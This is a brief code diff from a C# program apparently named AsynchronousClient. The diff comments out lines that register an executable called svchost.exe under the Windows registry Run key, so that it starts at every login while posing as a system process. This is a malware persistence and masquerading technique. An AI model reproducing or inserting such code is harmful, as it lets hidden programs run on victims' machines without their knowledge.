@@ -203,9 +203,9 @@ public class AsynchronousClient
 
     public static int Main(String[] args)
     {
-        String path =  Environment.CurrentDirectory + "\\svchost.exe";
+       /* String path =  Environment.CurrentDirectory + "\\svchost.exe";
         RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-        key.SetValue("svchost", path, RegistryValueKind.String);
+        key.SetValue("svchost", path, RegistryValueKind.String);*/
         StartClient();
         return 0;
     }
